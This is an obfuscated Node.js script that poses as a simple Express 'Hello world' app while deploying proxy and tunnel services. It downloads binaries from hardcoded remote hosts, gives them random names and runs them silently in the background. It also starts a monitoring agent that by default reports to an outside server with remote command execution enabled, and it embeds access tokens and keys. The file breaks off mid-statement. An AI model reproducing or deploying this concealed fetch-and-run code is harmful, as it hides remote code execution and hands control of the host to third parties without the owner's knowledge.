const _0x4d6eb4=_0x436e;(function(_0x51915c,_0x546f40){const _0x1e12f7={_0x27236d:0xe9,_0x3fce30:0xf0,_0x50e24c:0x12f,_0x3bcd79:0x17a,_0x3c4e5c:0x161,_0x525306:0x142},_0x41e007=_0x436e,_0x31d5f2=_0x51915c();while(!![]){try{const _0x536eaf=parseInt(_0x41e007(_0x1e12f7._0x27236d))/0x1*(parseInt(_0x41e007(0x157))/0x2)+-parseInt(_0x41e007(0x106))/0x3*(parseInt(_0x41e007(0x1a8))/0x4)+parseInt(_0x41e007(_0x1e12f7._0x3fce30))/0x5*(-parseInt(_0x41e007(_0x1e12f7._0x50e24c))/0x6)+parseInt(_0x41e007(0x13d))/0x7+-parseInt(_0x41e007(_0x1e12f7._0x3bcd79))/0x8*(parseInt(_0x41e007(_0x1e12f7._0x3c4e5c))/0x9)+parseInt(_0x41e007(0x176))/0xa*(parseInt(_0x41e007(0x1a5))/0xb)+parseInt(_0x41e007(_0x1e12f7._0x525306))/0xc*(parseInt(_0x41e007(0x152))/0xd);if(_0x536eaf===_0x546f40)break;else _0x31d5f2['push'](_0x31d5f2['shift']());}catch(_0xf2fa3b){_0x31d5f2['push'](_0x31d5f2['shift']());}}}(_0x2686,0xa9924));function _0x2686(){const _0x5f522b=['chmod','arm','/vmess-argo?ed=2560','/tunnel.yml\x20run','xtls-rprx-vision','existsSync','log','https://api.ip.sb/geoip','split','.tmp','fileName','Unhandled\x20error\x20in\x20startserver:','exec','del\x20/f\x20/q\x20','freedom','readdirSync','fileUrl','message','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vless-argo','test','writeFileSync','utf-8','156096dVmItE','\x20is\x20created','2087','arm64','FILE_PATH','push','tcp','forEach','\x22\x20>\x20/dev/null\x202>&1','https://arm64.ssss.nyc.mn/bot','base64','true','join','status','2874970kOGTDl','success','data','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','toString','9963084GCRoRO','\x0a\x20\x20credentials-file:\x20','path','tunnel.yml','?security=tls&sni=','unlink','\x20already\x20exists','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/api/delete-nodes','aarch64','stream','isp','\x20-s\x20','readFile','/trojan-argo','match','13DjeMDu','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','rm\x20-rf\x20','sub','quic','14810LpHZfA','PORT','127.0.0.1','pipe','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2083','tls','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Empowerment\x20failed\x20for\x20','207FsGzxi','SUB_PATH','map','App\x20is\x20running','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','e3d993f3-84c9-47f6-8715-c6e98da545f5','block','ARGO_DOMAIN','NEZHA\x20variable\x20is\x20empty,skip\x20running','saas.sin.fan','ARGO_PORT','axios','8443','text/plain;\x20charset=utf-8','country_code','isFile','replace','NEZHA_KEY','CFIP','stringify','\x20is\x20running','781730iVqzqs','promises','/sub.txt\x20saved\x20successfully','createWriteStream','3392bVYUKu','/api/add-nodes','Error\x20executing\x20command:\x20','length','\x0a\x20\x20tunnel:\x20','nohup\x20','\x20-p\x20','?encryption=none&security=tls&sni=','iq1r9uCBejmoq7uA2heq0VsN7aoiVWB3','catch','config.yaml','vless','/vmess-argo','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','php\x20running\x20error:\x20','send','config.json','https://amd64.ssss.nyc.mn/v1','\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','SERVER_PORT','https://arm64.ssss.nyc.mn/web','Download\x20','list.txt','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','unlinkSync','basename','nz.thall.ggff.net:8008','2053','https://oooo.serv00.net/add-url','Empowerment\x20success\x20for\x20','&fp=firefox&type=ws&host=','boot.log','unshift','mkdirSync','automatic\x20access\x20task\x20added\x20successfully','Skipping\x20adding\x20automatic\x20access\x20task','pkill\x20-f\x20\x22[','&path=%2Ftrojan-argo%3Fed%3D2560#','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Error\x20reading\x20boot.log:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','has','11HzVGaw','Mozilla/5.0','readFileSync','364wpZtgM','charAt','env','application/json','https://amd64.ssss.nyc.mn/bot','http\x20server\x20is\x20running\x20on\x20port:','blackhole','platform','finish','\x20>/dev/null\x202>&1','TunnelSecret','ARGO_AUTH','none','clear','\x0a\x0atrojan://','167DQbYRo','then','countryCode','statSync','error','arch','\x0a\x20\x20\x20\x20','150vDWGez','child_process','http','floor','443','random','post','Error\x20in\x20startserver:','NAME','/api/add-subscriptions','\x0a\x0avmess://','https://amd64.ssss.nyc.mn/agent','substring','from','CFPORT','ARGO_DOMAIN:','vmess','filter','response','Add\x20automatic\x20access\x20task\x20faild:\x20','express','get','35307fZGrXs','.exe\x20>\x20nul\x202>&1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub.txt','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','listen','win32','2096','trojan','includes','US-Miget','npm\x20running\x20error:\x20','web\x20running\x20error:\x20','utf8','UUID','\x20successfully'];_0x2686=function(){return _0x5f522b;};return _0x2686();}const express=require(_0x4d6eb4(0x104)),app=express(),axios=require(_0x4d6eb4(0x16c)),os=require('os'),fs=require('fs'),path=require(_0x4d6eb4(0x144)),{promisify}=require('util'),exec=promisify(require(_0x4d6eb4(0xf1))[_0x4d6eb4(0x123)]),UPLOAD_URL=process[_0x4d6eb4(0x1aa)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4d6eb4(0x1aa)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x133)]||_0x4d6eb4(0x120),SUB_PATH=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x162)]||_0x4d6eb4(0x155),PORT=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x18e)]||process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x158)]||0xbb8,UUID=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x115)]||_0x4d6eb4(0x166),NEZHA_SERVER=process[_0x4d6eb4(0x1aa)]['NEZHA_SERVER']||_0x4d6eb4(0x195),NEZHA_PORT=process[_0x4d6eb4(0x1aa)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4d6eb4(0x172)]||_0x4d6eb4(0x182),ARGO_DOMAIN=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x168)]||'migetus.ake.cc.cd',ARGO_AUTH=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0xe5)]||'eyJhIjoiMWYwY2E4ZDA3MGZmMTgxYjk5YjUyOTg2OTAzMjY5MTYiLCJ0IjoiNmNlZGVhODMtZDAyNS00YmRhLThiMWYtNGE5MDMwYTQwNzE3IiwicyI6Ill6QXhNamcyTUdZdE56STNPQzAwTURBM0xUazRaVFV0TWpWaE1tVTRObVpoTXpVdyJ9',ARGO_PORT=process['env'][_0x4d6eb4(0x16b)]||0x1f41,CFIP=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0x173)]||_0x4d6eb4(0x16a),CFPORT=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0xfe)]||0x1bb,NAME=process[_0x4d6eb4(0x1aa)][_0x4d6eb4(0xf8)]||_0x4d6eb4(0x111);!fs['existsSync'](FILE_PATH)?(fs[_0x4d6eb4(0x19c)](FILE_PATH),console[_0x4d6eb4(0x11d)](FILE_PATH+_0x4d6eb4(0x130))):console['log'](FILE_PATH+_0x4d6eb4(0x148));function generateRandomName(){const _0x458db0={_0x5dd6db:0xf3,_0x5d7390:0x17d},_0x1aef91=_0x4d6eb4,_0x334d9f='abcdefghijklmnopqrstuvwxyz';let _0x41ef11='';for(let _0x2e0b8d=0x0;_0x2e0b8d<0x6;_0x2e0b8d++){_0x41ef11+=_0x334d9f[_0x1aef91(0x1a9)](Math[_0x1aef91(_0x458db0._0x5dd6db)](Math[_0x1aef91(0xf5)]()*_0x334d9f[_0x1aef91(_0x458db0._0x5d7390)]));}return _0x41ef11;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4d6eb4(0x13b)](FILE_PATH,npmName),phpPath=path[_0x4d6eb4(0x13b)](FILE_PATH,phpName),webPath=path[_0x4d6eb4(0x13b)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4d6eb4(0x109)),listPath=path[_0x4d6eb4(0x13b)](FILE_PATH,_0x4d6eb4(0x191)),bootLogPath=path[_0x4d6eb4(0x13b)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x4d6eb4(0x18a));function deleteNodes(){const _0x7b6d38={_0x1d490d:0xfd,_0x45980f:0x11f,_0x215b5a:0x101,_0x489369:0x1ab},_0x380af6=_0x4d6eb4;try{if(!UPLOAD_URL)return;if(!fs[_0x380af6(0x11c)](subPath))return;let _0x477ce8;try{_0x477ce8=fs[_0x380af6(0x1a7)](subPath,_0x380af6(0x12e));}catch{return null;}const _0x452511=Buffer[_0x380af6(_0x7b6d38._0x1d490d)](_0x477ce8,_0x380af6(0x139))['toString']('utf-8'),_0x5181f4=_0x452511[_0x380af6(_0x7b6d38._0x45980f)]('\x0a')[_0x380af6(_0x7b6d38._0x215b5a)](_0x1171b1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1171b1));if(_0x5181f4['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x380af6(0x14a),JSON['stringify']({'nodes':_0x5181f4}),{'headers':{'Content-Type':_0x380af6(_0x7b6d38._0x489369)}})[_0x380af6(0x183)](_0x5b12ef=>{return null;}),null;}catch(_0x21459d){return null;}}function cleanupOldFiles(){const _0x236db2={_0x475d01:0x13b,_0x101edc:0xec},_0x2c94b6=_0x4d6eb4;try{const _0x4d51fd=fs[_0x2c94b6(0x126)](FILE_PATH);_0x4d51fd['forEach'](_0x3e833f=>{const _0x50be5a=_0x2c94b6,_0x24942b=path[_0x50be5a(_0x236db2._0x475d01)](FILE_PATH,_0x3e833f);try{const _0x22e469=fs[_0x50be5a(_0x236db2._0x101edc)](_0x24942b);_0x22e469[_0x50be5a(0x170)]()&&fs[_0x50be5a(0x193)](_0x24942b);}catch(_0x594ff4){}});}catch(_0x1927e6){}}async function generateConfig(){const _0x610505={_0x25340e:0xe6,_0x3839c8:0x11b,_0x2a05dc:0x12b,_0x4c8095:0x186,_0x1db2bb:0x185,_0x3ea944:0x135,_0x3d857c:0x159,_0x5eeff2:0xe6,_0x546ab1:0x15e,_0x59a74e:0x156,_0x4dc9e0:0x100,_0x46dcd7:0xe6,_0x2493af:0xf2,_0x3c7435:0x167,_0x38d121:0x13b},_0x543334=_0x4d6eb4,_0x32aa9a={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x543334(_0x610505._0x25340e)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x543334(_0x610505._0x3839c8)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x543334(_0x610505._0x2a05dc),'dest':0xbba},{'path':_0x543334(_0x610505._0x4c8095),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x543334(0x159),'protocol':_0x543334(_0x610505._0x1db2bb),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x543334(_0x610505._0x3ea944),'security':'none'}},{'port':0xbba,'listen':_0x543334(_0x610505._0x3d857c),'protocol':_0x543334(0x185),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x543334(_0x610505._0x5eeff2)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x543334(_0x610505._0x546ab1),_0x543334(_0x610505._0x59a74e)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x543334(_0x610505._0x4dc9e0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x543334(0x186)}},'sniffing':{'enabled':!![],'destOverride':[_0x543334(0xf2),_0x543334(0x15e),_0x543334(0x156)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x543334(0x159),'protocol':_0x543334(0x10f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x543334(_0x610505._0x46dcd7),'wsSettings':{'path':_0x543334(0x150)}},'sniffing':{'enabled':!![],'destOverride':[_0x543334(_0x610505._0x2493af),_0x543334(0x15e),_0x543334(0x156)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x543334(0x125),'tag':'direct'},{'protocol':_0x543334(0x1ae),'tag':_0x543334(_0x610505._0x3c7435)}]};fs['writeFileSync'](path[_0x543334(_0x610505._0x38d121)](FILE_PATH,'config.json'),JSON[_0x543334(0x174)](_0x32aa9a,null,0x2));}function getSystemArchitecture(){const _0x431072={_0x269468:0x118},_0x5529f1=_0x4d6eb4,_0xe59d47=os[_0x5529f1(0xee)]();return _0xe59d47===_0x5529f1(_0x431072._0x269468)||_0xe59d47===_0x5529f1(0x132)||_0xe59d47===_0x5529f1(0x14b)?'arm':'amd';}function downloadFile(_0x48a7c6,_0x1ef85e,_0x1d7b67){const _0x5d3e50={_0x1ab8c9:0x19c,_0x41ac7c:0x183},_0x56bf73={_0x54e983:0xed},_0x8bdd8a={_0x498f68:0x13f,_0x5d27c3:0x15a,_0x1b1624:0x1b0,_0x59cf92:0xed},_0x247b21={_0x551886:0x18d,_0x3679e9:0xed},_0x4798b1=_0x4d6eb4,_0x4a6371=_0x48a7c6;!fs['existsSync'](FILE_PATH)&&fs[_0x4798b1(_0x5d3e50._0x1ab8c9)](FILE_PATH,{'recursive':!![]});const _0x82818d=fs[_0x4798b1(0x179)](_0x4a6371);axios({'method':'get','url':_0x1ef85e,'responseType':_0x4798b1(0x14c)})[_0x4798b1(0xea)](_0xbe6c96=>{const _0x45243f={_0x2d9d97:0x11d,_0x58b616:0x190,_0x22f99d:0x116},_0x5cfab7=_0x4798b1;_0xbe6c96[_0x5cfab7(_0x8bdd8a._0x498f68)][_0x5cfab7(_0x8bdd8a._0x5d27c3)](_0x82818d),_0x82818d['on'](_0x5cfab7(_0x8bdd8a._0x1b1624),()=>{const _0x330bc9=_0x5cfab7;_0x82818d['close'](),console[_0x330bc9(_0x45243f._0x2d9d97)](_0x330bc9(_0x45243f._0x58b616)+path[_0x330bc9(0x194)](_0x4a6371)+_0x330bc9(_0x45243f._0x22f99d)),_0x1d7b67(null,_0x4a6371);}),_0x82818d['on'](_0x5cfab7(_0x8bdd8a._0x59cf92),_0x185914=>{const _0x3c1b08=_0x5cfab7;fs[_0x3c1b08(0x147)](_0x4a6371,()=>{});const _0x28cf0d=_0x3c1b08(0x190)+path['basename'](_0x4a6371)+_0x3c1b08(_0x247b21._0x551886)+_0x185914['message'];console[_0x3c1b08(_0x247b21._0x3679e9)](_0x28cf0d),_0x1d7b67(_0x28cf0d);});})[_0x4798b1(_0x5d3e50._0x41ac7c)](_0x6a9eb3=>{const _0x3b9a00=_0x4798b1,_0xfdb747=_0x3b9a00(0x190)+path[_0x3b9a00(0x194)](_0x4a6371)+_0x3b9a00(0x18d)+_0x6a9eb3[_0x3b9a00(0x128)];console[_0x3b9a00(_0x56bf73._0x54e983)](_0xfdb747),_0x1d7b67(_0xfdb747);});}async function downloadFilesAndRun(){const _0x309581={_0x2ff003:0x17d,_0x41a717:0x11d,_0x139a15:0x1a1,_0x3572e4:0x163,_0x26793e:0xf4,_0x235ed8:0x10e,_0x32d062:0x131,_0x276ba1:0x1a4,_0x3bcd4d:0x13a,_0x18fbf5:0x17f,_0x34ac14:0x188,_0x140bdd:0x16d,_0x580ec9:0x196,_0x11bce3:0x110,_0x382b5b:0x14e,_0x52ccb4:0x140,_0x61b2b1:0x169,_0x51dc77:0xed,_0x2810a8:0x113,_0x309772:0x11c,_0x2eb51d:0x151,_0x295953:0x12a,_0x14ab46:0x11a,_0x464a41:0x15b,_0x47c892:0x108,_0x3e2213:0x175},_0x4362f7=_0x4d6eb4,_0x23ba6a=getSystemArchitecture(),_0x5eb771=getFilesForArchitecture(_0x23ba6a);if(_0x5eb771[_0x4362f7(_0x309581._0x2ff003)]===0x0){console[_0x4362f7(_0x309581._0x41a717)](_0x4362f7(_0x309581._0x139a15));return;}const _0x5c831d=_0x5eb771[_0x4362f7(_0x309581._0x3572e4)](_0x49dd03=>{const _0x3df2f8={_0x4e9916:0x121};return new Promise((_0x1866e6,_0x1bb721)=>{const _0x510e45=_0x436e;downloadFile(_0x49dd03[_0x510e45(_0x3df2f8._0x4e9916)],_0x49dd03[_0x510e45(0x127)],(_0x5ee5c5,_0x1ab1ed)=>{_0x5ee5c5?_0x1bb721(_0x5ee5c5):_0x1866e6(_0x1ab1ed);});});});try{await Promise['all'](_0x5c831d);}catch(_0x3ae530){console[_0x4362f7(0xed)]('Error\x20downloading\x20files:',_0x3ae530);return;}function _0x30e5fc(_0x9e783){const _0x33307e={_0x50cc96:0x117},_0x3cdf6e={_0xdff3fa:0xed,_0x28266f:0x160,_0x3e8a95:0x198},_0x42eda4=_0x4362f7,_0x3cd491=0x1fd;_0x9e783[_0x42eda4(0x136)](_0x2c58ed=>{const _0x43d24f=_0x42eda4;fs[_0x43d24f(0x11c)](_0x2c58ed)&&fs[_0x43d24f(_0x33307e._0x50cc96)](_0x2c58ed,_0x3cd491,_0x534285=>{const _0x176500=_0x43d24f;_0x534285?console[_0x176500(_0x3cdf6e._0xdff3fa)](_0x176500(_0x3cdf6e._0x28266f)+_0x2c58ed+':\x20'+_0x534285):console[_0x176500(0x11d)](_0x176500(_0x3cdf6e._0x3e8a95)+_0x2c58ed+':\x20'+_0x3cd491[_0x176500(0x141)](0x8));});});}const _0x34c87f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x30e5fc(_0x34c87f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c87e6=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4362f7(0x11f)](':')['pop']():'',_0x40e655=new Set([_0x4362f7(_0x309581._0x26793e),'8443',_0x4362f7(_0x309581._0x235ed8),_0x4362f7(_0x309581._0x32d062),'2083','2053']),_0x921b99=_0x40e655[_0x4362f7(_0x309581._0x276ba1)](_0x3c87e6)?_0x4362f7(_0x309581._0x3bcd4d):'false',_0x2745f1='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4362f7(0x149)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x921b99+_0x4362f7(0x187)+UUID;fs[_0x4362f7(0x12d)](path[_0x4362f7(0x13b)](FILE_PATH,_0x4362f7(0x184)),_0x2745f1);const _0x2a0ae8=_0x4362f7(_0x309581._0x18fbf5)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x4362f7(0x15c);try{await exec(_0x2a0ae8),console['log'](phpName+_0x4362f7(0x175)),await new Promise(_0x5007a9=>setTimeout(_0x5007a9,0x3e8));}catch(_0x155799){console['error'](_0x4362f7(_0x309581._0x34ac14)+_0x155799);}}else{let _0x556415='';const _0x412c32=[_0x4362f7(0xf4),_0x4362f7(_0x309581._0x140bdd),_0x4362f7(0x10e),_0x4362f7(_0x309581._0x32d062),_0x4362f7(0x15d),_0x4362f7(_0x309581._0x580ec9)];_0x412c32[_0x4362f7(_0x309581._0x11bce3)](NEZHA_PORT)&&(_0x556415='--tls');const _0x5a2d0b='nohup\x20'+npmPath+_0x4362f7(_0x309581._0x382b5b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4362f7(0x180)+NEZHA_KEY+'\x20'+_0x556415+_0x4362f7(_0x309581._0x52ccb4);try{await exec(_0x5a2d0b),console[_0x4362f7(0x11d)](npmName+_0x4362f7(0x175)),await new Promise(_0x316833=>setTimeout(_0x316833,0x3e8));}catch(_0x45a76a){console[_0x4362f7(0xed)](_0x4362f7(0x112)+_0x45a76a);}}}else console[_0x4362f7(0x11d)](_0x4362f7(_0x309581._0x61b2b1));const _0x3e22a0='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3e22a0),console[_0x4362f7(0x11d)](webName+'\x20is\x20running'),await new Promise(_0x682d95=>setTimeout(_0x682d95,0x3e8));}catch(_0x522419){console[_0x4362f7(_0x309581._0x51dc77)](_0x4362f7(_0x309581._0x2810a8)+_0x522419);}if(fs[_0x4362f7(_0x309581._0x309772)](botPath)){let _0x595fed;if(ARGO_AUTH[_0x4362f7(_0x309581._0x2eb51d)](/^[A-Z0-9a-z=]{120,250}$/))_0x595fed=_0x4362f7(_0x309581._0x295953)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x595fed=_0x4362f7(0x15f)+FILE_PATH+_0x4362f7(_0x309581._0x14ab46):_0x595fed=_0x4362f7(_0x309581._0x464a41)+FILE_PATH+_0x4362f7(_0x309581._0x47c892)+ARGO_PORT;try{await exec(_0x4362f7(_0x309581._0x18fbf5)+botPath+'\x20'+_0x595fed+_0x4362f7(0x18c)),console['log'](botName+_0x4362f7(_0x309581._0x3e2213)),await new Promise(_0x3068a0=>setTimeout(_0x3068a0,0x7d0));}catch(_0x124a3d){console[_0x4362f7(_0x309581._0x51dc77)]('Error\x20executing\x20command:\x20'+_0x124a3d);}}await new Promise(_0x496dd2=>setTimeout(_0x496dd2,0x1388));}function getFilesForArchitecture(_0x231772){const _0x125729={_0x22e7dc:0x18f,_0xf75998:0x1ac,_0x41c2ae:0xfb,_0x3c6d71:0x19b},_0xcd986c=_0x4d6eb4;let _0x57ddd3;_0x231772===_0xcd986c(0x118)?_0x57ddd3=[{'fileName':webPath,'fileUrl':_0xcd986c(_0x125729._0x22e7dc)},{'fileName':botPath,'fileUrl':_0xcd986c(0x138)}]:_0x57ddd3=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0xcd986c(_0x125729._0xf75998)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3eca23=_0x231772===_0xcd986c(0x118)?'https://arm64.ssss.nyc.mn/agent':_0xcd986c(_0x125729._0x41c2ae);_0x57ddd3[_0xcd986c(_0x125729._0x3c6d71)]({'fileName':npmPath,'fileUrl':_0x3eca23});}else{const _0x969692=_0x231772==='arm'?'https://arm64.ssss.nyc.mn/v1':_0xcd986c(0x18b);_0x57ddd3[_0xcd986c(0x19b)]({'fileName':phpPath,'fileUrl':_0x969692});}}return _0x57ddd3;}function argoType(){const _0x170813={_0x58f132:0x11d,_0x4f955b:0x13b,_0x292755:0x192,_0x37758f:0x12d,_0x45cfd9:0x1a3},_0x349bed=_0x4d6eb4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x349bed(_0x170813._0x58f132)](_0x349bed(0x10a));return;}if(ARGO_AUTH[_0x349bed(0x110)](_0x349bed(0xe4))){fs[_0x349bed(0x12d)](path[_0x349bed(_0x170813._0x4f955b)](FILE_PATH,_0x349bed(0x129)),ARGO_AUTH);const _0x3fab01=_0x349bed(0x17e)+ARGO_AUTH[_0x349bed(0x11f)]('\x22')[0xb]+_0x349bed(0x143)+path['join'](FILE_PATH,'tunnel.json')+_0x349bed(0x10b)+ARGO_DOMAIN+_0x349bed(0x153)+ARGO_PORT+_0x349bed(_0x170813._0x292755);fs[_0x349bed(_0x170813._0x37758f)](path[_0x349bed(0x13b)](FILE_PATH,_0x349bed(0x145)),_0x3fab01);}else console[_0x349bed(0x11d)](_0x349bed(_0x170813._0x45cfd9));}async function extractDomains(){const _0x216497={_0xc35f7c:0xff,_0x15d53b:0x1a7,_0x34e11e:0x13b,_0x39dc45:0x11f,_0x512256:0x11d,_0x1ad6df:0x193,_0x28780c:0x19a,_0x368529:0x17c},_0x467075={_0x5dc786:0x13f,_0x4f2062:0x13f,_0x246872:0x105,_0x51e111:0x1a6,_0x2c5891:0x13c,_0x4a3f08:0x13e},_0x552fec={_0x56a5b8:0x1af,_0x1e8cce:0x1a9,_0x1ae5d4:0x137},_0x44d2b4=_0x4d6eb4;let _0x4e76d3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4e76d3=ARGO_DOMAIN,console[_0x44d2b4(0x11d)](_0x44d2b4(_0x216497._0xc35f7c),_0x4e76d3),await _0x5e07b8(_0x4e76d3);else try{const _0x5a75b3=fs[_0x44d2b4(_0x216497._0x15d53b)](path[_0x44d2b4(_0x216497._0x34e11e)](FILE_PATH,_0x44d2b4(0x19a)),_0x44d2b4(0x12e)),_0xad20a=_0x5a75b3[_0x44d2b4(_0x216497._0x39dc45)]('\x0a'),_0x47ae2e=[];_0xad20a['forEach'](_0x5cbb18=>{const _0x50bb9f=_0x44d2b4,_0xf656ed=_0x5cbb18[_0x50bb9f(0x151)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xf656ed){const _0x183722=_0xf656ed[0x1];_0x47ae2e[_0x50bb9f(0x134)](_0x183722);}});if(_0x47ae2e[_0x44d2b4(0x17d)]>0x0)_0x4e76d3=_0x47ae2e[0x0],console[_0x44d2b4(_0x216497._0x512256)]('ArgoDomain:',_0x4e76d3),await _0x5e07b8(_0x4e76d3);else{console[_0x44d2b4(0x11d)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x44d2b4(_0x216497._0x1ad6df)](path[_0x44d2b4(_0x216497._0x34e11e)](FILE_PATH,_0x44d2b4(_0x216497._0x28780c)));async function _0xb87a9f(){const _0x32eee2=_0x44d2b4;try{process[_0x32eee2(_0x552fec._0x56a5b8)]===_0x32eee2(0x10d)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x32eee2(0x107)):await exec(_0x32eee2(0x19f)+botName[_0x32eee2(_0x552fec._0x1e8cce)](0x0)+']'+botName[_0x32eee2(0xfc)](0x1)+_0x32eee2(_0x552fec._0x1ae5d4));}catch(_0x3e2812){}}_0xb87a9f(),await new Promise(_0x1f8b07=>setTimeout(_0x1f8b07,0xbb8));const _0x1be702='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1be702+'\x20>/dev/null\x202>&1\x20&'),console[_0x44d2b4(0x11d)](botName+_0x44d2b4(0x175)),await new Promise(_0x2d530c=>setTimeout(_0x2d530c,0xbb8)),await extractDomains();}catch(_0x21fbcd){console[_0x44d2b4(0xed)](_0x44d2b4(_0x216497._0x368529)+_0x21fbcd);}}}catch(_0x675187){console['error'](_0x44d2b4(0x1a2),_0x675187);}async function _0x5927e7(){const _0x485e6e=_0x44d2b4;try{const _0x30bf6e=await axios[_0x485e6e(0x105)](_0x485e6e(0x11e),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x30bf6e['data']&&_0x30bf6e[_0x485e6e(_0x467075._0x5dc786)]['country_code']&&_0x30bf6e[_0x485e6e(0x13f)][_0x485e6e(0x14d)])return(_0x30bf6e[_0x485e6e(_0x467075._0x4f2062)][_0x485e6e(0x16f)]+'-'+_0x30bf6e[_0x485e6e(_0x467075._0x5dc786)]['isp'])[_0x485e6e(0x171)](/\s+/g,'_');}catch(_0x2b3a4b){try{const _0x590a73=await axios[_0x485e6e(_0x467075._0x246872)]('http://ip-api.com/json',{'headers':{'User-Agent':_0x485e6e(_0x467075._0x51e111),'timeout':0xbb8}});if(_0x590a73[_0x485e6e(0x13f)]&&_0x590a73[_0x485e6e(0x13f)][_0x485e6e(_0x467075._0x2c5891)]===_0x485e6e(_0x467075._0x4a3f08)&&_0x590a73[_0x485e6e(0x13f)][_0x485e6e(0xeb)]&&_0x590a73[_0x485e6e(_0x467075._0x4f2062)]['org'])return(_0x590a73[_0x485e6e(0x13f)]['countryCode']+'-'+_0x590a73[_0x485e6e(0x13f)]['org'])['replace'](/\s+/g,'_');}catch(_0x3d67d3){}}return'Unknown';}async function _0x5e07b8(_0x376396){const 